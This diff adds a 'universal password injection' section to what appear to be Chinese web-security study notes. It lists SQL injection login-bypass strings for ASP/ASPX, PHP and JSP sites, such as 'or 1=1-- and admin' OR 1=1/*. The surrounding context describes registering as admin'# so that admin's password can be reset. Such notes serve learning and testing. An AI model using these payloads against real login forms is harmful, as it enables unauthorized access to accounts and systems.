@@ -21,6 +21,22 @@
     适合在能提取数据的地方，例如利用注册信息成 admin'#，密码随意
     在利用找回密码，修改admin的密码
 ```
+###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x04 万能密码注入
+####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原理:
+![](/assets/QQ20190218-182024@2x.png)
+![](/assets/87E9A1A4708DED342D6152C1BC75DB04.png)
+####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;方法:
+```sql
+    asp aspx万能密码: ”or “a”=”a 、‘)or(‘a’=’a 、’or 1=1–、‘OR 1=1%00  
+    PHP万能密码:  'or'='or'、 'or 1=1/* 字符型 GPC是否开都可以使用、User: something/Pass: ' OR '1'='1
+    jsp 万能密码: 1'or'1'='1、admin' OR 1=1/*
+    https://blog.csdn.net/qq_36512966/article/details/72674794
+```
+
+
+
+
+
 
 
     
